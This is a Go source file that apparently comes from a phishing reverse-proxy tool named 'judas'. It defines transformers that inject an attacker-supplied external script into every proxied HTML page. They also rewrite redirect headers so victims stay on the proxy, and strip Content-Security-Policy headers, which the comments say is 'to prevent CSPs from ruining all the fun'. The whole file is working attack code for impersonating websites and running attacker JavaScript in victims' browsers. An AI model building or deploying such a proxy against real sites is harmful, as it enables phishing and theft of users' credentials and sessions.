package judas

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"

	"github.com/PuerkitoBio/goquery"
)

// ResponseTransformer modifies a response in any way we see fit, such as inserting extra JavaScript.
type ResponseTransformer interface {
	Transform(response *http.Response) error
}

// JavaScriptInjectionTransformer holds JavaScript filename for injecting into response.
type JavaScriptInjectionTransformer struct {
	JavascriptURL string
}

// Transform Injects JavaScript into an HTML response.
func (j JavaScriptInjectionTransformer) Transform(response *http.Response) error {
	if !strings.Contains(response.Header.Get("Content-Type"), "text/html") {
		return nil
	}

	// Prevent NewDocumentFromReader from closing the response body.
	responseText, err := ioutil.ReadAll(response.Body)
	responseBuffer := bytes.NewBuffer(responseText)
	response.Body = ioutil.NopCloser(responseBuffer)
	if err != nil {
		return err
	}

	document, err := goquery.NewDocumentFromResponse(response)
	if err != nil {
		return err
	}

	payload := fmt.Sprintf("<script type='text/javascript' src='%s'></script>", j.JavascriptURL)
	selection := document.
		Find("head").
		AppendHtml(payload).
		Parent()

	html, err := selection.Html()
	if err != nil {
		return err
	}
	response.Body = ioutil.NopCloser(bytes.NewBufferString(html))
	return nil
}

// LocationRewritingResponseTransformer prevents the Location header from redirecting users to the target website.
type LocationRewritingResponseTransformer struct{}

// Transform performs the Location rewrite.
func (l LocationRewritingResponseTransformer) Transform(response *http.Response) error {
	location, err := response.Location()
	if err != nil {
		if err == http.ErrNoLocation {
			return nil
		}
		return err
	}

	// Turn it into a relative URL
	location.Scheme = ""
	location.Host = ""
	response.Header.Set("Location", location.String())
	return nil
}

// CSPRemovingTransformer prevents CSP from ruining all the fun.
type CSPRemovingTransformer struct{}

// Transform removes CSPs from responses to prevent CSPs from ruining all the fun.
func (c CSPRemovingTransformer) Transform(response *http.Response) error {
	response.Header.Del("Content-Security-Policy")
	return nil
}
